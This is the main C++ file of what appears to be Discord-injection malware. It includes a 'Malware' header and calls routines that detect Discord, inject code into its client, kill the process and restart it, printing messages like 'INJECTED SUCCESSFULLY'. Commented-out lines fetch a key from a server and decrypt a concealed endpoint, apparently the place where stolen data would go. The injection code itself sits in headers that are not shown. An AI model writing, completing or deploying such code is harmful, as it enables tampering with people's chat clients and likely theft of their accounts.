//Our source
#include "lib/httpReq/HTTPRequest.hpp"
#include "features/Decrypt.hpp"
#include "features/Network.hpp"
#include "features/Malware.hpp"
#include "features/Discord.hpp"
#include "Settings.hpp"

/*
    Main File
    @file Main.cpp
    @author miaouCorp
    @version 1.0
*/


int main()
{
    Cipher place;
    Network oos;
    Discord aplet;
    Discord op;

    aplet.checkDiscord();

    if (aplet.isDiscordInstalled())
    {
        std::cout << "This is working";
    } else {
        std::cout << "NOT WORKING";
    }

    op.injectDiscord();

    if (op.isInjectionWrited())
    {
        std::cout << "INJECTED SUCCESSFULLY";
    } else { 
        std::cout << "\nNOT INJECTED :(";
    }

    op.killDiscord();
    if (op.isDiscordKilled())
        std::cout << "\n Kill avec succes";
        op.restartDiscord();
        if (op.isDiscordRestarted())
            std::cout << "\nAKED";

    // std::string meow{ oos.getNetworkKey("http://127.0.0.1:5000/giveMyKey") };
    // std::cout << meow;
    // place.parseBase(meow);

    // std::cout << "NOT HASHED: \n KEY:" << place.getKey() << "\nENDPOINT:" << place.getEndPoint();
    // std::cout << "\nENDPOINT:" << place.superDecrypt(place.getKey(), place.getEndPoint());
}